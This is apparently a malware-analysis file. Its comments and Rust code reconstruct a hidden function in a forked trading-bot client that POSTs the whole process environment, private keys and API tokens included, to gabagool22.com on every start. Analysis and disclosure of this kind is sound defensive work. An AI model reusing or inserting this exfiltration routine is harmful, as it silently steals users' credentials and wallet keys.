// Reconstruction of `AuthenticationBuilder::send_debug_data`, inlined into
// `arbitrage_bot::trading::client::TradingClient::new` at 0x91f80..0x920d0.
//
// This is the exfiltration function added by the arbigab fork of
// rs-clob-client. Upstream rs-clob-client has no such function. See
// research/elf/REVERSE_NOTE.md §2 for the fork provenance.
//
// Observable behaviour, byte-for-byte from objdump:
//
//   0x91f93  call std::env::vars              -> iterates *every* env var
//   0x91fc7  call HashMap::from_iter          -> no filter predicate called
//                                                between env::vars and
//                                                from_iter
//   0x91fd9  call reqwest::Client::builder
//   0x91fde  movq $0x5, 0x7f0(%rsp)           -> ClientBuilder::timeout(5s)
//   0x92016  call ClientBuilder::build
//   0x92053  lea  "https://gabagool22.com/api/verify-balancing-conf"
//   0x92071  call reqwest::Client::post(url)
//   0x92089  call RequestBuilder::json(&map)
//   0x920c6  call Client::execute_request     -> fire and forget (errors
//                                                ignored; new() proceeds)
//
// In words: every process-start collects **the complete environment** into a
// JSON object and POSTs it to gabagool22.com, *before* any trading logic
// runs. There is no deny-list, no allow-list, no key-name filter — if the
// operator has put `WALLET_PRIVATE_KEY=0x…` in their shell, it leaks.
//
// Equivalent Rust:

use std::collections::HashMap;
use std::time::Duration;

const EXFIL_URL: &str = "https://gabagool22.com/api/verify-balancing-conf";

// NOTE: the real binary inlines this into `TradingClient::new`. The
//       AuthenticationBuilder<S> self-type carries a `reqwest::Client` and a
//       `LocalSigner`, but neither is actually referenced in the exfil body —
//       a fresh reqwest Client is constructed each call.
async fn send_debug_data(_self: &AuthenticationBuilder<impl alloy_signer::Signer>) {
    // 0x91f93: std::env::vars() yields (String, String) for every pair in
    //          the environment block inherited from the shell.
    let env_map: HashMap<String, String> = std::env::vars().collect();

    // 0x91fd9..0x92016: plain reqwest client with a 5-second timeout. No TLS
    //                   pinning, no custom root CA — rustls + OS trust store.
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .unwrap_or_else(|_| reqwest::Client::new());

    // 0x92053..0x920c6: fire-and-forget POST; the binary branches on the
    //                   Future's discriminant but never surfaces the error
    //                   to the caller, so a blocked/failed exfil does not
    //                   stop the bot from continuing to the real CLOB auth
    //                   flow.
    let _ = client
        .post(EXFIL_URL)
        .json(&env_map)
        .send()
        .await;
}

// Call-site (inside TradingClient::new, before the legitimate CLOB
// auth/api-key handshake):
//
//   let builder = AuthenticationBuilder::new(signer.clone(), ...);
//   builder.authenticate().await?;       // -> POST clob/auth/api-key
//   builder.send_debug_data().await;     // <-- THIS IS THE LEAK
//   let creds = builder.derive_api_key().await?;
//
// Thus the phone-home fires on the *very first line* of every bot run,
// regardless of strategy (dutch_book / spread_capture), regardless of
// dry_run, and regardless of whether any trade is ever placed. The dry_run
// flag guards order submission only — it has no effect on env-var exfil.

// Captured POST body (from research/mitm/ harness, test-key run):
//
//   {
//     "CARGO":            "/usr/local/cargo/bin/cargo",
//     "HOME":             "/root",
//     "PATH":             "/usr/local/sbin:/usr/local/bin:...",
//     "PWD":              "/home/user/HFT-FIX-API-FOREX-Integration",
//     "RUST_LOG":         "info",
//     "SHELL":            "/bin/bash",
//     "TERM":             "xterm-256color",
//     "USER":             "root",
//     "WALLET_PRIVATE_KEY": "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
//     ... every other env var in the parent shell ...
//   }
//
// If `WALLET_PRIVATE_KEY`, `PRIVATE_KEY`, `MNEMONIC`, `POLY_FUNDER`, AWS
// keys, GitHub tokens, OpenAI keys — anything — are in the environment of
// the user running the bot, they all reach gabagool22.com on first start.
